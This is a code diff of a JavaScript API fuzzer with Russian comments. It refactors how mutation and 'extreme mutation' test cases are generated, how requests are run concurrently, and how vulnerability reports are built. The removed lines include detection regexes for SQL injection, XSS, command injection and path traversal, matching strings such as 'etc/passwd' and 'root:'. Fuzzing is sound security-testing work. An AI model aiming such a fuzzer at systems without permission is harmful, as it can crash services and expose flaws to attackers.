+          url: finalUrl,
+          path: pathUrl,
+          type: 'mutation',
+          subType: 'test_body',
+          queryParams: null,
+          headers: { ...baseHeaders },
+          body: mutatedTestBody,
+          payload: { type: 'test_data', mutated: mutatedTestBody }
+        });
+        
+        // Extreme мутация для тестовых данных
+        for (let i = 0; i < CONFIG.EXTREME_MUTATION_COUNT; i++) {
+          try {
+            const extremeTestData = JSON.parse(JSON.stringify(testData));
+            const mutated = this.mutator.mutateObjectExtreme(extremeTestData, 0, CONFIG.MUTATION_DEPTH);
+            if (mutated) {
+              testCases.push({
+                id: `${method}_${pathUrl}_extreme_mutation_test_${i}`,
+                method,
+                url: finalUrl,
+                path: pathUrl,
+                type: 'extreme_mutation',
+                subType: 'test',
+                queryParams: null,
+                headers: { ...baseHeaders },
+                body: mutated,
+                payload: { type: 'test_data', mutated: mutated }
+              });
+            }
+          } catch (e) {
+            writeLog('debug', `Ошибка extreme мутации test: ${e.message}`);
+          }
         }
-
-        // Mutation тесты (с мутатором)
-        const mutation = this.generateMutationPayload(operation);
-        if (mutation) {
-          testCases.push(this._createTestCase({
-            id: `${method}_${pathUrl}_mutation`, method, url: this.interpolateUrl(fullUrl, mutation.path),
-            path: pathUrl, type: 'mutation', queryParams: mutation.query,
-            headers: baseHeaders, body: mutation.body, expectedStatus: EXPECTED_STATUS.mutation,
-            mutationPayload: mutation
-          }));
-        }
-
-        testCases.push(...this.generateRateLimitTests(operation));
       }
     }
-
-    this.testCases = testCases;
-    logger.info(`Сгенерировано ${testCases.length} тестов (с использованием StructureMutator)`);
-    return testCases;
   }
 
-  _extractParams(operation) {
-    const params = { path: {}, query: {}, header: {} };
-    for (const param of operation.parameters || []) {
-      const value = this.generatePayload(param.schema) ?? (param.required ? 'test' : null);
-      if (value !== null && param.in) {
-        params[param.in][param.name] = value;
-      }
+  this.testCases = testCases;
+  this.stats.total = testCases.length;
+  
+  const mutationCount = testCases.filter(t => t.type === 'mutation' || t.type === 'extreme_mutation').length;
+  writeLog('info', `✅ Сгенерировано ${testCases.length} тестов (включая ${mutationCount} мутационных)`);
+  
+  return testCases;
+}
+
+  async run() {
+    writeLog('info', '🚀 ЗАПУСК SUPER FUZZER');
+    writeLog('info', '='.repeat(60));
+    
+    this.startTime = Date.now();
+    await this.loadSpec();
+    this.generateTestCases();
+    
+    const results = [];
+    let completed = 0;
+    
+    const chunks = this.chunkArray(this.testCases, this.concurrency);
+    
+    for (const chunk of chunks) {
+      const chunkResults = await Promise.all(
+        chunk.map(async (testCase) => {
+          const result = await this.executeTest(testCase);
+          completed++;
+          return result;
+        })
+      );
+      results.push(...chunkResults);
     }
-    return params;
+    
+    this.results = results;
+    const report = this.getReport();
+    
+    writeLog('info', '✅ ФАЗЗИНГ ЗАВЕРШЕН');
+    writeLog('info', `📊 Статистика: ${this.stats.total} тестов, ${this.stats.vulnerabilities} уязвимостей`);
+    
+    return report;
   }
 
-  _createTestCase(data) {
-    return {
-      ...data,
-      operation: data.operation || `${data.method}_${data.path.replace(/\//g, '_')}`,
-      timestamp: new Date().toISOString()
-    };
-  }
-
-  // ==================== ВЫПОЛНЕНИЕ ТЕСТОВ ====================
-
-  async executeWithRetry(testCase, retryCount = 0) {
-    try {
-      return await this._executeRequest(testCase);
-    } catch (error) {
-      if (retryCount < this.maxRetries && RETRYABLE_ERRORS.includes(error.code)) {
-        logger.debug(`Retrying ${testCase.id}, attempt ${retryCount + 1}`);
-        await new Promise(resolve => setTimeout(resolve, this.retryDelay));
-        return this.executeWithRetry(testCase, retryCount + 1);
-      }
-      throw error;
-    }
-  }
-
-  async _executeRequest(testCase) {
+  async executeTest(testCase) {
     const startTime = Date.now();
-    let response = null, error = null;
-
+    let response = null;
+    let error = null;
+    
     try {
       const config = {
         method: testCase.method,
@@ -631,325 +1318,90 @@ class APIFuzzer {
         timeout: this.timeout,
         headers: testCase.headers,
         validateStatus: () => true,
-        maxContentLength: this.maxResponseSize,
-        maxBodyLength: this.maxResponseSize,
-        decompress: true
+        maxContentLength: CONFIG.MAX_RESPONSE_SIZE
       };
-
+      
       if (testCase.queryParams && Object.keys(testCase.queryParams).length > 0) {
         config.params = testCase.queryParams;
       }
-      if (testCase.body) config.data = testCase.body;
-
+      if (testCase.body) {
+        config.data = testCase.body;
+      }
+      
       response = await axios(config);
     } catch (err) {
-      logger.error('Fuzz error:', err.message);
       error = err;
     }
-
+    
     const duration = Date.now() - startTime;
-    const responseData = this._extractResponseData(response);
-    const payload = this._extractPayload(testCase);
-
+    const vulnerabilities = this.detector.detect(response, testCase);
+    
+    if (vulnerabilities.length > 0) {
+      this.stats.vulnerabilities += vulnerabilities.length;
+      writeLog('vuln', `🔥 НАЙДЕНА УЯЗВИМОСТЬ!`, vulnerabilities[0]);
+    }
+    
     return {
       ...testCase,
       status: response?.status || 0,
-      statusText: response?.statusText || error?.code || 'ERROR',
       duration,
-      responseSize: responseData?.length || 0,
-      responseData,
+      vulnerabilities,
       error: error?.message,
-      timestamp: new Date().toISOString(),
-      success: this._isSuccess(response?.status, testCase),
-      vulnerabilities: this._detectVulnerabilities(testCase, response),
-      payload
+      timestamp: new Date().toISOString()
     };
   }
 
-  _extractResponseData(response) {
-    if (!response?.data) return null;
-    try {
-      const dataStr = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
-      return dataStr.substring(0, 1000);
-    } catch {
-      return '[Unable to stringify response]';
+  chunkArray(array, size) {
+    if (!Array.isArray(array)) return [];
+    const chunks = [];
+    for (let i = 0; i < array.length; i += size) {
+      chunks.push(array.slice(i, i + size));
     }
-  }
-
-  _extractPayload(testCase) {
-    if (testCase.injectionPayload) return testCase.injectionPayload;
-    if (testCase.largePayload) return testCase.largePayload;
-    if (testCase.mutationPayload) return testCase.mutationPayload;
-    if (testCase.headerPayload) return testCase.headerPayload;
-    if (testCase.body || testCase.queryParams) {
-      return { body: testCase.body, query: testCase.queryParams, headers: testCase.headers };
-    }
-    return null;
-  }
-
-  _isSuccess(status, testCase) {
-    const expected = EXPECTED_STATUS[testCase.type] || [];
-    return expected.includes(status);
-  }
-
-  // ==================== ОБНАРУЖЕНИЕ УЯЗВИМОСТЕЙ ====================
-
-  _detectVulnerabilities(testCase, response) {
-    const vulns = [];
-    const resp = response?.data ? JSON.stringify(response.data) : '';
-    const status = response?.status || 0;
-
-    if (testCase.type === 'injection') {
-      vulns.push(...this._checkInjectionVulnerabilities(testCase, resp, status));
-    }
-
-    if (testCase.type === 'header_fuzzing') {
-      vulns.push(...this._checkHeaderVulnerabilities(testCase, resp, status));
-    }
-
-    if (testCase.type === 'large' && status === 500) {
-      vulns.push(this._createVulnerability('DoS via Large Payload', 'high', testCase, resp, 'Server crashed on large payload'));
-    }
-
-    if (testCase.type === 'mutation' && status === 500) {
-      vulns.push(this._createVulnerability('Crash via Structure Mutation', 'high', testCase, resp, 'Server crashed on malformed structure'));
-    }
-
-    if (resp.includes('password') || resp.includes('token') || resp.includes('secret')) {
-      vulns.push(this._createVulnerability('Potential Data Leak', 'high', testCase, resp, resp.substring(0, 200)));
-    }
-
-    if (testCase.type === 'rate_limit_rapid') {
-      const rapidVuln = this._checkRateLimitRapid(testCase, status);
-      if (rapidVuln) vulns.push(rapidVuln);
-    }
-
-    return vulns;
-  }
-
-  _checkInjectionVulnerabilities(testCase, resp, status) {
-    const vulns = [];
-    const key = `${testCase.path}_${testCase.method}`;
-    
-    if (!this._counters.injection[key]) {
-      this._counters.injection[key] = { sql: false, xss: false, cmd: false, pathTraversal: false };
-    }
-
-    const patterns = {
-      sql: /SQL syntax|mysql_fetch|ORA-\d{5}|PostgreSQL|SQLite|syntax error|unclosed quotation/i,
-      xss: /<script>|alert\(|onerror=|javascript:|onload=/i,
-      cmd: /uid=|root:|etc\/passwd|win\.ini|C:\\Windows/i,
-      pathTraversal: /\.\.\/|root\.txt|passwd|\.\.\\/i
-    };
-
-    if (patterns.sql.test(resp) && !this._counters.injection[key].sql) {
-      this._counters.injection[key].sql = true;
-      vulns.push(this._createVulnerability('SQL Injection', 'critical', testCase, resp, resp.substring(0, 200)));
-    }
-    if (patterns.xss.test(resp) && !this._counters.injection[key].xss) {
-      this._counters.injection[key].xss = true;
-      vulns.push(this._createVulnerability('XSS', 'high', testCase, resp, resp.substring(0, 200)));
-    }
-    if (patterns.cmd.test(resp) && !this._counters.injection[key].cmd) {
-      this._counters.injection[key].cmd = true;
-      vulns.push(this._createVulnerability('Command Injection', 'critical', testCase, resp, resp.substring(0, 200)));
-    }
-    if (patterns.pathTraversal.test(resp) && !this._counters.injection[key].pathTraversal) {
-      this._counters.injection[key].pathTraversal = true;
-      vulns.push(this._createVulnerability('Path Traversal', 'high', testCase, resp, resp.substring(0, 200)));
-    }
-
-    return vulns;
-  }
-
-  _checkHeaderVulnerabilities(testCase, resp, status) {
-    const vulns = [];
-    const key = `${testCase.path}_${testCase.method}_header`;
-    
-    if (!this._counters.header[key]) {
-      this._counters.header[key] = { crashes: 0, reflections: 0, authBypasses: 0 };
-    }
-
-    if (status === 500 && this._counters.header[key].crashes++ === 0) {
-      vulns.push(this._createVulnerability('Header Injection - Server Crash', 'high', testCase, resp, 'Server crashed on malicious headers'));
-    }
-
-    if (testCase.headers && (
-        resp.includes(testCase.headers['User-Agent']) || 
-        resp.includes(testCase.headers['Referer']))) {
-      if (this._counters.header[key].reflections++ === 0) {
-        vulns.push(this._createVulnerability('Header Reflection', 'medium', testCase, resp, resp.substring(0, 200)));
-      }
-    }
-
-    return vulns;
-  }
-
-  _checkRateLimitRapid(testCase, status) {
-    const key = `${testCase.path}_${testCase.method}_rapid`;
-    
-    if (!this._counters.rateLimit[key]) {
-      this._counters.rateLimit[key] = { success: 0, total: 0, endpoint: testCase.path, method: testCase.method };
-    }
-
-    this._counters.rateLimit[key].total++;
-    if (status === 200) this._counters.rateLimit[key].success++;
-
-    if (this._counters.rateLimit[key].total === 10) {
-      const { success, endpoint, method } = this._counters.rateLimit[key];
-      delete this._counters.rateLimit[key];
-      
-      if (success >= 8) {
-        return this._createVulnerability('Missing Rate Limiting', 'medium', testCase, '', 
-          `${success} successful requests out of 10 without rate limiting`);
-      }
-    }
-    return null;
-  }
-
-  _createVulnerability(type, severity, testCase, snippet, message) {
-    return {
-      type, severity,
-      endpoint: testCase.path,
-      method: testCase.method,
-      payload: testCase.payload,
-      response_status: testCase.status,
-      snippet: snippet.substring(0, 200),
-      message
-    };
-  }
-
-  // ==================== ЗАПУСК И ОТЧЕТЫ ====================
-
-  async run() {
-    this._counters = this._initCounters();
-    this.startTime = Date.now();
-    this.results = [];
-    
-    await this.loadSpec();
-    this.generateTestCases();
-
-    const concurrencyLimit = Math.min(this.concurrency, this.testCases.length);
-    let currentIndex = 0;
-    
-    const workers = Array(concurrencyLimit).fill().map(() => this._runWorker(() => currentIndex++));
-    await Promise.all(workers);
-
-    return this.getReport();
-  }
-
-  async _runWorker(getNextIndex) {
-    while (true) {
-      const index = getNextIndex();
-      if (index >= this.testCases.length) break;
-      
-      const tc = this.testCases[index];
-      try {
-        const res = await this.executeWithRetry(tc);
-        this.results.push(res);
-      } catch (error) {
-        logger.error(`Failed ${tc.id}: ${error.message}`);
-        this.results.push({ ...tc, status: 0, error: error.message, success: false, timestamp: new Date().toISOString() });
-      }
-    }
+    return chunks;
   }
 
   getReport() {
-    const byEndpoint = {};
     const allVulnerabilities = [];
-    const failedTests = [];
-
-    for (const r of this.results) {
-      if (!byEndpoint[r.path]) {
-        byEndpoint[r.path] = { total: 0, vulnerabilities: 0, methods: {} };
-      }
-      
-      byEndpoint[r.path].total++;
-      
-      const vulnsCount = r.vulnerabilities?.length || 0;
-      byEndpoint[r.path].vulnerabilities += vulnsCount;
-
-      if (!byEndpoint[r.path].methods[r.method]) {
-        byEndpoint[r.path].methods[r.method] = { total: 0, vulnerabilities: 0 };
-      }
-      byEndpoint[r.path].methods[r.method].total++;
-      byEndpoint[r.path].methods[r.method].vulnerabilities += vulnsCount;
-
-      if (!r.success) {
-        failedTests.push({
-          endpoint: r.path, method: r.method, type: r.type,
-          status: r.status, error: r.error, duration: r.duration,
-          payload: r.payload, response: r.responseData, timestamp: r.timestamp
+    const vulnStats = {};
+    
+    for (const result of this.results) {
+      const vulnerabilities = result.vulnerabilities || [];
+      for (const vuln of vulnerabilities) {
+        allVulnerabilities.push({
+          ...vuln,
+          payload: safeStringify(vuln.payload, 200)
         });
-      }
-
-      if (r.vulnerabilities?.length) {
-        allVulnerabilities.push(...r.vulnerabilities);
+        vulnStats[vuln.type] = (vulnStats[vuln.type] || 0) + 1;
       }
     }
-
-    const uniqueVulnerabilities = this._deduplicateVulnerabilities(allVulnerabilities);
-    const uniqueFailedTests = this._deduplicateFailedTests(failedTests);
-
-    return {
+    
+    const report = {
       success: true,
-      message: 'Фаззинг тестирование завершено',
+      session_id: SESSION_ID,
+      log_file: LOG_FILE,
       summary: {
-        total: this.results.length,
-        success: this.results.filter(r => r.success).length,
-        failed: this.results.filter(r => !r.success).length,
-        duration: (Date.now() - this.startTime) / 1000,
+        total_tests: this.results.length,
+        vulnerabilities_found: allVulnerabilities.length,
+        unique_types: Object.keys(vulnStats).length,
+        duration_seconds: (Date.now() - this.startTime) / 1000,
+        endpoints_tested: new Set(this.results.map(r => r?.path).filter(Boolean)).size,
         concurrency: this.concurrency,
-        timeout: this.timeout,
-        endpoints_tested: Object.keys(byEndpoint).length
+        mutation_tests: this.results.filter(r => r.type === 'mutation' || r.type === 'extreme_mutation').length
       },
-      byEndpoint,
-      vulnerabilities: uniqueVulnerabilities,
-      failedTests: uniqueFailedTests,
-      timestamp: new Date().toISOString(),
-      spec: {
-        title: this.spec.info?.title || 'Unknown',
-        version: this.spec.info?.version || 'Unknown',
-        endpoints: Object.keys(this.spec.paths || {}).length
-      }
+      vulnerabilities_by_type: vulnStats,
+      vulnerabilities: allVulnerabilities,
+      timestamp: new Date().toISOString()
     };
-  }
-
-  _deduplicateVulnerabilities(vulnerabilities) {
-    const uniqueMap = new Map();
-    for (const vuln of vulnerabilities) {
-      const key = `${vuln.endpoint}_${vuln.method}_${vuln.type}_${vuln.severity}`;
-      if (!uniqueMap.has(key)) {
-        uniqueMap.set(key, { ...vuln, count: 1, first_seen: vuln.timestamp, last_seen: vuln.timestamp });
-      } else {
-        const existing = uniqueMap.get(key);
-        existing.count++;
-        existing.last_seen = vuln.timestamp;
-      }
-    }
-    return Array.from(uniqueMap.values()).map(v => ({ ...v, duplicate_count: v.count - 1 }));
-  }
-
-  _deduplicateFailedTests(failedTests) {
-    const uniqueMap = new Map();
-    for (const test of failedTests) {
-      const key = `${test.endpoint}_${test.method}_${test.type}_${test.status}_${test.error || 'no_error'}`;
-      if (!uniqueMap.has(key)) {
-        uniqueMap.set(key, { ...test, count: 1 });
-      } else {
-        uniqueMap.get(key).count++;
-      }
-    }
-    return Array.from(uniqueMap.values()).map(t => ({ ...t, duplicate_count: t.count - 1 }));
+    
+    writeLog('info', '📊 ОТЧЕТ', report.summary);
+    
+    return report;
   }
 
   saveReport(file) {
     const report = this.getReport();
-    const ext = path.extname(file).toLowerCase();
-    const content = (ext === '.yaml' || ext === '.yml') 
-      ? yaml.dump(report, { indent: 2, lineWidth: -1, noRefs: true })
-      : JSON.stringify(report, null, 2);
-    fs.writeFileSync(file, content, 'utf8');
+    fs.writeFileSync(file, JSON.stringify(report, null, 2));
+    writeLog('info', `📄 Отчет сохранен: ${file}`);
     return report;
   }
 }
